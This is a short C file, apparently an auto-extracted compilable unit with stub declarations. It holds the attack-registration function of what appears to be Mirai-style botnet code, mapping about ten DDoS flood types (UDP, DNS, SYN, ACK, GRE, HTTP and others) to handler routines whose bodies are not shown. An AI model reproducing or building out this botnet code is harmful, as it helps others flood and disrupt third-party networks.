
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int BOOL ;
typedef int ATTACK_FUNC ;


 int ATK_VEC_ACK ;
 int ATK_VEC_DNS ;
 int ATK_VEC_GREETH ;
 int ATK_VEC_GREIP ;
 int ATK_VEC_HTTP ;
 int ATK_VEC_STOMP ;
 int ATK_VEC_SYN ;
 int ATK_VEC_UDP ;
 int ATK_VEC_UDP_PLAIN ;
 int ATK_VEC_VSE ;
 int TRUE ;
 int add_attack (int ,int ) ;
 scalar_t__ attack_app_http ;
 scalar_t__ attack_gre_eth ;
 scalar_t__ attack_gre_ip ;
 scalar_t__ attack_tcp_ack ;
 scalar_t__ attack_tcp_stomp ;
 scalar_t__ attack_tcp_syn ;
 scalar_t__ attack_udp_dns ;
 scalar_t__ attack_udp_generic ;
 scalar_t__ attack_udp_plain ;
 scalar_t__ attack_udp_vse ;

BOOL attack_init(void)
{
    int i;

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
 add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);


    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);

    return TRUE;
}
